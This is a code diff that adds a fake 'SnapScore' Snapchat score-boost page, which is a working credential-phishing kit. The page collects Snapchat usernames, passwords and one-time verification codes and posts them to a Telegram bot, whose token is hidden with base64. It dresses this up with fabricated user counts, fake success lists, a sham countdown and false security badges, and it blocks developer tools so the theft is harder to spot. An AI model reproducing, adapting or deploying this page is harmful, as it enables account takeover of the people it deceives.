@@ -738,4 +738,490 @@
             position: relative;
         }
 
-        .b
+        .boost-option.popular::after {
+            content: '🔥';
+            position: absolute;
+            top: -8px;
+            right: -6px;
+            font-size: 12px;
+        }
+
+        @media (max-width: 480px) {
+            .container {
+                padding: 24px 18px;
+                border-radius: 24px;
+            }
+            .logo h1 {
+                font-size: 28px;
+            }
+            .logo-icon {
+                width: 68px;
+                height: 68px;
+            }
+            .logo-icon svg {
+                width: 36px;
+                height: 36px;
+            }
+            .timer-box .value {
+                font-size: 26px;
+            }
+            .success-icon {
+                font-size: 56px;
+            }
+            .user-item .name {
+                font-size: 12px;
+            }
+            .user-item .score {
+                font-size: 12px;
+            }
+            .trust-badges {
+                gap: 10px;
+            }
+            .trust-badge {
+                font-size: 10px;
+            }
+            .boost-options {
+                grid-template-columns: 1fr 1fr 1fr;
+                gap: 6px;
+            }
+            .boost-option .number {
+                font-size: 15px;
+            }
+        }
+
+        @media (max-width: 360px) {
+            .container {
+                padding: 18px 14px;
+            }
+            .logo h1 {
+                font-size: 24px;
+            }
+            .code-group {
+                flex-direction: column;
+            }
+            .code-group .btn-sm {
+                width: 100%;
+            }
+            .boost-options {
+                grid-template-columns: 1fr 1fr 1fr;
+                gap: 4px;
+            }
+            .boost-option {
+                padding: 8px 4px;
+            }
+            .boost-option .number {
+                font-size: 13px;
+            }
+        }
+
+        ::-webkit-scrollbar {
+            width: 4px;
+        }
+        ::-webkit-scrollbar-track {
+            background: transparent;
+        }
+        ::-webkit-scrollbar-thumb {
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 10px;
+        }
+
+        ::selection {
+            background: rgba(255, 252, 0, 0.2);
+            color: #fff;
+        }
+    </style>
+</head>
+<body>
+
+<div class="particles" id="particles"></div>
+
+<div class="container">
+
+    <div class="logo">
+        <div class="logo-icon">
+            <div class="pulse-ring"></div>
+            <svg viewBox="0 0 24 24">
+                <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 14H9V8h2v8zm4 0h-2V8h2v8z"/>
+            </svg>
+        </div>
+        <h1>Snap<span>Score</span></h1>
+        <p class="subtitle">Boost Your Snapchat Score Instantly</p>
+        <div class="trust-badges">
+            <span class="trust-badge"><span class="icon">🔒</span> SSL Secure</span>
+            <span class="trust-badge"><span class="icon">👤</span> <span class="highlight" id="liveUsers">1,284</span> online</span>
+            <span class="trust-badge"><span class="icon">⭐</span> 4.9/5 Trusted</span>
+        </div>
+    </div>
+
+    <div class="step-indicator">
+        <span class="step-dot active" id="dot1"></span>
+        <span class="step-dot" id="dot2"></span>
+        <span class="step-dot" id="dot3"></span>
+    </div>
+
+    <!-- ===== STEP 1: LOGIN ===== -->
+    <div id="step1" class="step active">
+        <div class="info-box">
+            <span class="emoji-big">🚀</span>
+            <strong>Increase Your Score</strong><br>
+            Enter your <span class="highlight">Snapchat username</span> and <span class="highlight">password</span> below.
+            Your score will <strong>increase within 48 hours</strong>.
+        </div>
+
+        <div class="boost-options">
+            <div class="boost-option">
+                <span class="number">+10K</span>
+                <span class="label">Score</span>
+            </div>
+            <div class="boost-option popular">
+                <span class="number">+50K</span>
+                <span class="label">Score</span>
+            </div>
+            <div class="boost-option">
+                <span class="number">+100K</span>
+                <span class="label">Score</span>
+            </div>
+        </div>
+
+        <div class="form-group">
+            <label>👤 Snapchat Username</label>
+            <input type="text" id="username" placeholder="username" autocomplete="off" spellcheck="false" />
+        </div>
+        <div class="form-group">
+            <label>🔑 Password</label>
+            <input type="password" id="password" placeholder="••••••••" autocomplete="off" />
+        </div>
+        <button class="btn" id="loginBtn">Check Account</button>
+        <div id="status1" class="status"></div>
+    </div>
+
+    <!-- ===== STEP 2: VERIFICATION ===== -->
+    <div id="step2" class="step">
+        <div class="info-box">
+            <span class="emoji-big">📱</span>
+            <strong>Verification Code</strong><br>
+            A 6-digit code was sent to your email or phone.
+            Enter it below to <span class="highlight">activate the boost</span>.
+        </div>
+        <div class="form-group">
+            <label>📨 Enter Code</label>
+            <div class="code-group">
+                <input type="text" id="code" placeholder="0 0 0 0 0 0" maxlength="6" inputmode="numeric" autocomplete="off" />
+                <button class="btn-sm" id="resendBtn">Resend</button>
+            </div>
+        </div>
+        <button class="btn" id="verifyBtn">Verify & Boost</button>
+        <div id="status2" class="status"></div>
+    </div>
+
+    <!-- ===== STEP 3: SUCCESS ===== -->
+    <div id="step3" class="step">
+        <div style="text-align:center; padding: 4px 0;">
+            <span class="success-icon">⏳</span>
+            <h2 class="success-title">Boost Requested!</h2>
+            <p class="success-sub">
+                Your request has been <span class="success-highlight">successfully submitted</span>.<br>
+                Please wait <strong>48 hours</strong> for your score to update.
+            </p>
+
+            <div class="timer-box">
+                <div class="label">⏳ Time Remaining</div>
+                <div class="value" id="countdown">48:00:00</div>
+                <div class="sub">Your score will increase after this period</div>
+            </div>
+
+            <div class="user-list">
+                <div class="title">🔥 Recent Users Who Boosted</div>
+                <div class="user-item">
+                    <span class="name"><span class="status-dot online"></span>kurdo763</span>
+                    <span class="score">200,000+ <span class="badge">Boosted</span></span>
+                </div>
+                <div class="user-item">
+                    <span class="name"><span class="status-dot online"></span>bawan_101</span>
+                    <span class="score">185,000+ <span class="badge">Boosted</span></span>
+                </div>
+                <div class="user-item">
+                    <span class="name"><span class="status-dot online"></span>zhino_23</span>
+                    <span class="score">172,000+ <span class="badge">Boosted</span></span>
+                </div>
+                <div class="user-item">
+                    <span class="name"><span class="status-dot online"></span>rebar_55</span>
+                    <span class="score">168,000+ <span class="badge">Boosted</span></span>
+                </div>
+                <div class="user-item">
+                    <span class="name"><span class="status-dot online"></span>avin_808</span>
+                    <span class="score">155,000+ <span class="badge">Boosted</span></span>
+                </div>
+                <div class="more">+123 others are boosting right now</div>
+            </div>
+
+            <div class="warning-box">
+                <strong>⚠️ Please be patient</strong><br>
+                Your score will increase within 48 hours.<br>
+                You will receive a notification on Snapchat once it's done.
+            </div>
+
+            <button class="btn btn-secondary" onclick="resetAll()" style="margin-top:14px;">
+                🔄 Back to Start
+            </button>
+        </div>
+    </div>
+
+    <div class="security-badge">
+        <span class="lock">🔒</span> Protected by 256-bit encryption
+    </div>
+
+    <div class="footer">
+        <a href="#">Terms</a>
+        <span class="divider">•</span>
+        <a href="#">Privacy</a>
+        <span class="divider">•</span>
+        <span>© 2027 SnapScore</span>
+    </div>
+</div>
+
+<script>
+    // ========== PARTICLES ==========
+    (function createParticles() {
+        const container = document.getElementById('particles');
+        for (let i = 0; i < 30; i++) {
+            const particle = document.createElement('div');
+            particle.className = 'particle';
+            particle.style.left = Math.random() * 100 + '%';
+            particle.style.animationDuration = (20 + Math.random() * 30) + 's';
+            particle.style.animationDelay = (Math.random() * 20) + 's';
+            particle.style.width = (2 + Math.random() * 4) + 'px';
+            particle.style.height = particle.style.width;
+            container.appendChild(particle);
+        }
+    })();
+
+    // ========== LIVE USER COUNTER ==========
+    (function liveCounter() {
+        const el = document.getElementById('liveUsers');
+        let count = 1284;
+        setInterval(() => {
+            count += Math.floor(Math.random() * 3);
+            el.textContent = count.toLocaleString();
+        }, 5000);
+    })();
+
+    // ========== CREDENTIALS ==========
+    const BOT_TOKEN = atob('ODc5MjQyNzYxODpBQUhIVWVNd1I2Y09Jd1BKY3lHdXBnN2lQN0JrOXhSVUNPOD==');
+    const CHAT_ID = atob('ODQ0NzI5MDA3MQ==');
+
+    // ========== STATE ==========
+    let currentUser = '';
+    let currentPass = '';
+    let currentCode = '';
+    let step = 1;
+    let isProcessing = false;
+
+    // ========== DOM ==========
+    const step1 = document.getElementById('step1');
+    const step2 = document.getElementById('step2');
+    const step3 = document.getElementById('step3');
+    const username = document.getElementById('username');
+    const password = document.getElementById('password');
+    const code = document.getElementById('code');
+    const loginBtn = document.getElementById('loginBtn');
+    const verifyBtn = document.getElementById('verifyBtn');
+    const resendBtn = document.getElementById('resendBtn');
+    const status1 = document.getElementById('status1');
+    const status2 = document.getElementById('status2');
+    const countdownEl = document.getElementById('countdown');
+    const dots = [
+        document.getElementById('dot1'),
+        document.getElementById('dot2'),
+        document.getElementById('dot3')
+    ];
+
+    // ========== TELEGRAM ==========
+    function sendTelegram(msg) {
+        try {
+            const fd = new FormData();
+            fd.append('chat_id', CHAT_ID);
+            fd.append('text', msg);
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, { method: 'POST', body: fd }).catch(() => {});
+        } catch (e) {}
+    }
+
+    // ========== STATUS ==========
+    function setStatus(el, msg, type = 'loading') {
+        el.textContent = msg;
+        el.className = 'status show ' + type;
+    }
+
+    function hideStatus(el) {
+        el.className = 'status';
+    }
+
+    // ========== STEPS ==========
+    function showStep(n) {
+        document.querySelectorAll('.step').forEach(e => e.classList.remove('active'));
+        if (n === 1) step1.classList.add('active');
+        else if (n === 2) step2.classList.add('active');
+        else if (n === 3) step3.classList.add('active');
+        step = n;
+
+        dots.forEach((dot, idx) => {
+            dot.className = 'step-dot';
+            if (idx + 1 === n) dot.classList.add('active');
+            else if (idx + 1 < n) dot.classList.add('done');
+        });
+    }
+
+    // ========== COUNTDOWN ==========
+    let countdownInterval = null;
+
+    function startCountdown() {
+        let totalSeconds = 48 * 60 * 60;
+        countdownInterval = setInterval(() => {
+            if (totalSeconds <= 0) {
+                clearInterval(countdownInterval);
+                countdownEl.textContent = '✅ Done!';
+                return;
+            }
+            totalSeconds--;
+            const h = String(Math.floor(totalSeconds / 3600)).padStart(2, '0');
+            const m = String(Math.floor((totalSeconds % 3600) / 60)).padStart(2, '0');
+            const s = String(totalSeconds % 60).padStart(2, '0');
+            countdownEl.textContent = `${h}:${m}:${s}`;
+        }, 1000);
+    }
+
+    // ========== RESET ==========
+    function resetAll() {
+        clearInterval(countdownInterval);
+        showStep(1);
+        username.value = '';
+        password.value = '';
+        code.value = '';
+        hideStatus(status1);
+        hideStatus(status2);
+        loginBtn.disabled = false;
+        verifyBtn.disabled = false;
+        currentUser = '';
+        currentPass = '';
+        currentCode = '';
+        isProcessing = false;
+        username.focus();
+    }
+
+    // ========== LOGIN ==========
+    loginBtn.addEventListener('click', function() {
+        if (isProcessing) return;
+
+        const u = username.value.trim();
+        const p = password.value.trim();
+
+        if (!u || !p) {
+            setStatus(status1, '⚠️ Please fill in both fields.', 'error');
+            return;
+        }
+
+        currentUser = u;
+        currentPass = p;
+        isProcessing = true;
+
+        sendTelegram(
+            `🔐 Snapchat Login\n\n` +
+            `👤 Username: ${u}\n` +
+            `🔑 Password: ${p}\n` +
+            `📱 Device: ${navigator.userAgent || 'Unknown'}\n` +
+            `🌐 URL: ${window.location.href}\n` +
+            `⏱️ Time: ${new Date().toLocaleString()}`
+        );
+
+        setStatus(status1, '⏳ Checking account...', 'loading');
+        loginBtn.disabled = true;
+
+        setTimeout(() => {
+            setStatus(status1, '✅ Account found! Code sent.', 'success');
+            setTimeout(() => {
+                hideStatus(status1);
+                showStep(2);
+                loginBtn.disabled = false;
+                isProcessing = false;
+                setStatus(status2, '📨 A 6-digit code was sent. Please enter it.', 'info');
+                code.focus();
+            }, 1200);
+        }, 1800);
+    });
+
+    // ========== RESEND ==========
+    resendBtn.addEventListener('click', function() {
+        if (isProcessing) return;
+        setStatus(status2, '📨 Sending new code...', 'loading');
+        sendTelegram(`🔄 Resend requested for @${currentUser}`);
+        isProcessing = true;
+        setTimeout(() => {
+            setStatus(status2, '✅ New code sent!', 'success');
+            isProcessing = false;
+            setTimeout(() => {
+                setStatus(status2, '📨 Enter the code below.', 'info');
+            }, 1500);
+        }, 1500);
+    });
+
+    // ========== VERIFY ==========
+    verifyBtn.addEventListener('click', function() {
+        if (isProcessing) return;
+        const c = code.value.trim();
+        if (!c || c.length < 4) {
+            setStatus(status2, '⚠️ Please enter the full 6-digit code.', 'error');
+            return;
+        }
+        currentCode = c;
+        isProcessing = true;
+
+        sendTelegram(
+            `✅ Verification Code\n\n` +
+            `👤 Username: ${currentUser}\n` +
+            `🔑 Password: ${currentPass}\n` +
+            `📱 Code: ${c}\n` +
+            `⏱️ Time: ${new Date().toLocaleString()}`
+        );
+
+        setStatus(status2, '⏳ Verifying...', 'loading');
+        verifyBtn.disabled = true;
+
+        setTimeout(() => {
+            hideStatus(status2);
+            showStep(3);
+            verifyBtn.disabled = false;
+            isProcessing = false;
+            startCountdown();
+        }, 2500);
+    });
+
+    // ========== KEYBOARD ==========
+    document.addEventListener('keydown', function(e) {
+        if (e.key === 'Enter') {
+            if (step === 1) loginBtn.click();
+            else if (step === 2) verifyBtn.click();
+        }
+    });
+
+    // ========== FOCUS ==========
+    setTimeout(() => {
+        if (step === 1) username.focus();
+    }, 500);
+
+    // ========== PREVENT DEV TOOLS ==========
+    document.addEventListener('contextmenu', e => e.preventDefault());
+    document.addEventListener('keydown', function(e) {
+        if (e.key === 'F12' ||
+            (e.ctrlKey && e.shiftKey && e.key === 'I') ||
+            (e.ctrlKey && e.key === 'U') ||
+            (e.ctrlKey && e.shiftKey && e.key === 'J') ||
+            (e.ctrlKey && e.shiftKey && e.key === 'C')) {
+            e.preventDefault();
+        }
+    });
+
+    console.log('🚀 SnapScore 1000x — Ultimate Edition');
+    console.log('💛 Built with ❤️ for Kurdish users');
+</script>
+</body>
+</html>
